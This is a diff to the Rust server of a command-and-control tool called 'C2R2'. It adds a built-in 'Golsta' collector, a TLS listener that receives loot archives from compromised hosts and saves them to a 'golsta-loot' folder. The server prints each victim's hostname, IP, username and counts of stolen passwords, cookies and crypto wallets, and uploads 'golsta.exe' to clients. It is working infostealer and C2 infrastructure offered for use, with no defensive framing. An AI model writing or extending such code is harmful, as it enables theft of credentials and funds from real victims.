@@ -25,10 +25,11 @@ use tracing_subscriber::EnvFilter;
 // API module for team client communication
 mod agent_builder;
 mod api;
+mod golsta_collector;
 use api::{
-    create_api_router, AgentInfo as ApiAgentInfo, ApiState, DirEntry as ApiDirEntry, GolstaClient,
-    GolstaHarvest, GolstaHarvestList,
+    create_api_router, AgentInfo as ApiAgentInfo, ApiState, GolstaHarvest, GolstaHarvestList,
 };
+use golsta_collector::{parse_secret_hex, spawn_golsta_collector, GolstaStore};
 
 type ClientId = u64;
 
@@ -81,9 +82,24 @@ struct Args {
     #[arg(long = "api-password", default_value = "c2r2-secret")]
     api_password: String,
 
-    /// URL del backend privado de Golsta (token en GOLSTA_INTEGRATION_TOKEN)
-    #[arg(long = "golsta-url", default_value = "http://127.0.0.1:18080")]
-    golsta_url: String,
+    /// Dirección donde escuchar el collector nativo de Golsta
+    #[arg(long = "golsta-bind", default_value = "0.0.0.0")]
+    golsta_bind: String,
+
+    /// Puerto TLS del collector nativo de Golsta
+    #[arg(long = "golsta-port", default_value_t = 9090)]
+    golsta_port: u16,
+
+    /// Directorio donde guardar los archives recibidos por Golsta
+    #[arg(long = "golsta-loot", default_value = "golsta-loot")]
+    golsta_loot: PathBuf,
+
+    /// Shared secret hexadecimal del protocolo Golsta
+    #[arg(
+        long = "golsta-secret",
+        default_value = "6368616e67655f746869735f736563726574"
+    )]
+    golsta_secret: String,
 
     /// Modo verboso
     #[arg(short, long)]
@@ -1158,85 +1174,76 @@ fn unseen_golsta_harvests(
 }
 
 async fn watch_golsta_harvest(
-    golsta: GolstaClient,
+    golsta: GolstaStore,
     known_ids: HashSet<String>,
     client_id: ClientId,
 ) {
     let deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(120);
-    let mut last_error = None;
 
     loop {
-        match golsta.harvests().await {
-            Ok(list) => {
-                let new_harvests = unseen_golsta_harvests(list, &known_ids);
-                if !new_harvests.is_empty() {
-                    println!();
-                    println!(
-                        "{}",
-                        format!(
-                            "╔════════ GOLSTA — RESULTADO RECIBIDO [{}] ════════╗",
-                            client_id
-                        )
-                        .bright_green()
-                        .bold()
-                    );
-                    for harvest in new_harvests {
-                        println!(
-                            "  {} {} ({})",
-                            "Host:".bright_cyan().bold(),
-                            harvest.hostname.bright_white(),
-                            harvest.ip.bright_black()
-                        );
-                        println!(
-                            "  {} {}",
-                            "Usuario:".bright_cyan().bold(),
-                            harvest.username.bright_white()
-                        );
-                        println!(
-                            "  {} passwords={} cookies={} wallets={}",
-                            "Datos:".bright_cyan().bold(),
-                            harvest.password_count,
-                            harvest.cookie_count,
-                            harvest.wallet_count
-                        );
-                        println!(
-                            "  {} {} ({} bytes)",
-                            "Archivo:".bright_cyan().bold(),
-                            harvest.id.bright_white(),
-                            harvest.size_bytes
-                        );
-                        info!(
-                            "[{}] Golsta recibido: {} (passwords={}, cookies={}, wallets={})",
-                            client_id,
-                            harvest.id,
-                            harvest.password_count,
-                            harvest.cookie_count,
-                            harvest.wallet_count
-                        );
-                    }
-                    println!(
-                        "{}",
-                        "╚══════════════════════════════════════════════════╝".bright_green()
-                    );
-                    println!();
-                    return;
-                }
+        let list = golsta.harvests();
+        let new_harvests = unseen_golsta_harvests(list, &known_ids);
+        if !new_harvests.is_empty() {
+            println!();
+            println!(
+                "{}",
+                format!(
+                    "╔════════ GOLSTA — RESULTADO RECIBIDO [{}] ════════╗",
+                    client_id
+                )
+                .bright_green()
+                .bold()
+            );
+            for harvest in new_harvests {
+                println!(
+                    "  {} {} ({})",
+                    "Host:".bright_cyan().bold(),
+                    harvest.hostname.bright_white(),
+                    harvest.ip.bright_black()
+                );
+                println!(
+                    "  {} {}",
+                    "Usuario:".bright_cyan().bold(),
+                    harvest.username.bright_white()
+                );
+                println!(
+                    "  {} passwords={} cookies={} wallets={}",
+                    "Datos:".bright_cyan().bold(),
+                    harvest.password_count,
+                    harvest.cookie_count,
+                    harvest.wallet_count
+                );
+                println!(
+                    "  {} {} ({} bytes)",
+                    "Archivo:".bright_cyan().bold(),
+                    harvest.id.bright_white(),
+                    harvest.size_bytes
+                );
+                info!(
+                    "[{}] Golsta recibido: {} (passwords={}, cookies={}, wallets={})",
+                    client_id,
+                    harvest.id,
+                    harvest.password_count,
+                    harvest.cookie_count,
+                    harvest.wallet_count
+                );
             }
-            Err(error) => last_error = Some(error),
+            println!(
+                "{}",
+                "╚══════════════════════════════════════════════════╝".bright_green()
+            );
+            println!();
+            return;
         }
 
         if tokio::time::Instant::now() >= deadline {
-            let detail = last_error
-                .map(|error| format!(" Último error: {error}"))
-                .unwrap_or_default();
             warn!(
-                "[{}] Golsta no publicó un resultado nuevo dentro de 120s.{}",
-                client_id, detail
+                "[{}] Golsta no publicó un resultado nuevo dentro de 120s.",
+                client_id
             );
             println!(
-                "{} Golsta no publicó un resultado nuevo dentro de 120s.{}",
-                "⚠️".bright_yellow(),
-                detail
+                "{} Golsta no publicó un resultado nuevo dentro de 120s.",
+                "⚠️".bright_yellow()
             );
             return;
         }
@@ -1325,6 +1332,32 @@ async fn main() {
 
     let tls_acceptor = TlsAcceptor::from(Arc::new(tls_config));
 
+    let golsta_secret = match parse_secret_hex(&args.golsta_secret) {
+        Ok(secret) if !secret.is_empty() => secret,
+        Ok(_) => {
+            eprintln!("{} El secreto Golsta está vacío", "❌ Error:".bright_red());
+            std::process::exit(1);
+        }
+        Err(error) => {
+            eprintln!("{} {}", "❌ Error Golsta:".bright_red(), error);
+            std::process::exit(1);
+        }
+    };
+    let golsta_store = match GolstaStore::new(args.golsta_loot.clone()) {
+        Ok(store) => store,
+        Err(error) => {
+            eprintln!("{} {}", "❌ Error Golsta:".bright_red(), error);
+            std::process::exit(1);
+        }
+    };
+    spawn_golsta_collector(
+        args.golsta_bind.clone(),
+        args.golsta_port,
+        tls_acceptor.clone(),
+        golsta_store.clone(),
+        golsta_secret,
+    );
+
     info!("╔══════════════════════════════════════════════════════════════╗");
     info!("║          C2R2 Server v2.0 TLS - Session Started            ║");
     info!("║          Listening: {}:{:<43}║", args.bind, args.port);
@@ -1361,6 +1394,16 @@ async fn main() {
     );
     println!(
         "{} {}",
+        "🔑 Golsta Collector:".bright_green().bold(),
+        format!("{}:{}", args.golsta_bind, args.golsta_port).bright_white()
+    );
+    println!(
+        "{} {}",
+        "📦 Golsta Loot:".bright_green().bold(),
+        args.golsta_loot.display().to_string().bright_white()
+    );
+    println!(
+        "{} {}",
         "📝 Help:".bright_yellow().bold(),
         "/help".bright_white()
     );
@@ -1387,21 +1430,12 @@ async fn main() {
     let next_id = Arc::new(AtomicU64::new(1));
     let selected_client: Arc<Mutex<Option<ClientId>>> = Arc::new(Mutex::new(None));
 
-    // Create API state for team client communication
-    let golsta = env::var("GOLSTA_INTEGRATION_TOKEN")
-        .ok()
-        .filter(|token| !token.trim().is_empty())
-        .and_then(|token| match GolstaClient::new(&args.golsta_url, token) {
-            Ok(client) => Some(client),
-            Err(error) => {
-                warn!("Integración Golsta deshabilitada: {}", error);
-                None
-            }
-        });
+    // Create API state for team client communication.
+    // Golsta is served by this process; no external integration token is needed.
     let api_state = Arc::new(ApiState::new(
         args.api_password.clone(),
         args.verbose,
-        golsta,
+        Some(golsta_store),
     ));
 
     // Start HTTP API server for team clients
@@ -1968,36 +2002,15 @@ async fn main() {
                                         .bright_red()
                                 );
                                 println!();
-                                let live_results = match api_state.golsta.clone() {
-                                    Some(golsta) => match golsta.harvests().await {
-                                        Ok(list) => Some((
-                                            golsta,
-                                            list.harvests
-                                                .into_iter()
-                                                .map(|harvest| harvest.id)
-                                                .collect::<HashSet<_>>(),
-                                        )),
-                                        Err(error) => {
-                                            warn!(
-                                                "[{}] No se pudo iniciar el monitoreo Golsta: {}",
-                                                id, error
-                                            );
-                                            println!(
-                                                "{} No se pudo iniciar el monitoreo en vivo: {}",
-                                                "⚠️".bright_yellow(),
-                                                error
-                                            );
-                                            None
-                                        }
-                                    },
-                                    None => {
-                                        println!(
-                                            "{} Configurá GOLSTA_INTEGRATION_TOKEN para ver resultados en vivo.",
-                                            "⚠️".bright_yellow()
-                                        );
-                                        None
-                                    }
-                                };
+                                let live_results = api_state.golsta.clone().map(|golsta| {
+                                    let known_ids = golsta
+                                        .harvests()
+                                        .harvests
+                                        .into_iter()
+                                        .map(|harvest| harvest.id)
+                                        .collect::<HashSet<_>>();
+                                    (golsta, known_ids)
+                                });
 
                                 println!("{}", "  📤 Subiendo golsta.exe...".bright_yellow());
 
